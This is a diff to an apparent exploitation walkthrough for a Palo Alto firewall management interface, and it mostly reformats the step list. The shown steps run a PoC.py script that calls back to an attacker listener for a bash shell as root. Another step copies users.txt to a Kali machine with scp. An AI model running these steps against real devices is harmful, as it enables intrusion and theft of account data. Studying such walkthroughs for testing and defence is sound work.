@@ -237,8 +237,12 @@ KG+Vs7e5$dF4
 ### Section 2. Execute the PoC Script
 
 1. In one of the empty terminal panes, execute the PoC.py script to trigger the exploit:
-   `python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_box> <port_of_initial_listener>`
-2. Watch the initial listener pane to ensure it catches the callback from the exploit.
+
+```bash
+python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_box> <port_of_initial_listener>
+```
+
+3. Watch the initial listener pane to ensure it catches the callback from the exploit.
    If you see the following, you have successfully exploited the Palo Alto and now have a limited bash shell into the root of the system:
    ![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)
 
@@ -313,8 +317,8 @@ sudo systemctl enable ssh
 sudo systemctl start ssh
 ```
 
-   To confirm the service has started, run
-   `systemctl status ssh`
+To confirm the service has started, run
+`systemctl status ssh`
 
 ```bash
 scp users.txt kali@<your_ip_address>:.
